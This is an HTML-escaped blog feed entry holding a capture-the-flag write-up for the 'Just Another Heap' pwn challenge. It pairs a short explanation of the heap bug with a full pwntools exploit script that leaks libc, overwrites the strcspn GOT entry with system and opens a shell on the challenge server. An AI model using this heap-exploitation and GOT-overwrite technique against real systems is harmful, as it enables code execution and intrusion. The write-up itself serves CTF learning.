&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;important&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;important&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;relive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;change&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Y&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;forget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;listing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dctf-chall-just-another-heap.westeurope.azurecontainer.io&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7481&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#p=process(&quot;./just_another_heap&quot;)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./just_another_heap&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1234&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;N&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;N&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x410&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1234&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;N&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;N&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1234&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;N&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;N&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;forget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;forget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#pause()
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x410&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;N&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;N&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#pause()
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;change&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;relive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3ebca0&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'strcspn'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sym&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'system'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;N&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;N&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;//bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Ainsetin</name></author><category term="ctf" /><summary type="html">Tasks PwnğŸ’» Just Another Heap (500pts) Just Another Heap (500pts) I couldnâ€™t solve this one prob in time, but I want to post this solving skills. Itâ€™s hard to find, but when I found it, Itâ€™s very simple Arbitrary Write. It has 5 user functions(create, relive, forget, change, listing). create() has a role that makes malloc_frame(0x20) and malloc_userinput(size). The point is, this prob has a unique fading input with this part. puts(&quot;How long is your memory&quot;); input_lu(&amp;amp;size); // no size check malloc_user = malloc(size); // size &amp;gt; 0x308 / forget -&amp;gt; unsorted bin puts(&quot;Sometimes our memories fade and we only remember parts of them.&quot;); input_lu(&amp;amp;fade); // no filter puts(&quot;Would you like to leave some space at the beginning in case you remember later?&quot;); if ( fade &amp;lt;= size ) { if ( malloc_user ) { for ( i = 0; i &amp;lt; fade; ++i ) malloc_user[i] = '_'; } malloc_user += fade; memories will be faded fade bytes with _, and user input is behind the _ strings if malloc_user is NOT 0. So, if malloc(size) returns 0, I can overwrite anywhere. Exploit First, set chunks that size&amp;gt;0x408 between 2 small chunks to leak libc from main_arena+xx. And make 1 tcache and 0x410 unsorted bin. Now main_arena+xx has written in unsorted bin. and if I rewrite and use change() to fill fade bytes and get libc addr with relive() function. change() function : overwrite from the beginning or behind fade _ strings relive() function : print user input with fade _ string Finally, Use This mentioned skills to do GOT Overwriting. memories will be faded fade bytes with _, and user input is behind the _ strings if malloc_user is NOT 0. So, if malloc(size) returns 0, I can overwrite anywhere. input /bin/sh\x00 in malloc_frame[] and program will call strcspn(addr,'\n'). Get The Shell. Code Here is the Exploit Code. from pwn import * context.log_level='debug' def 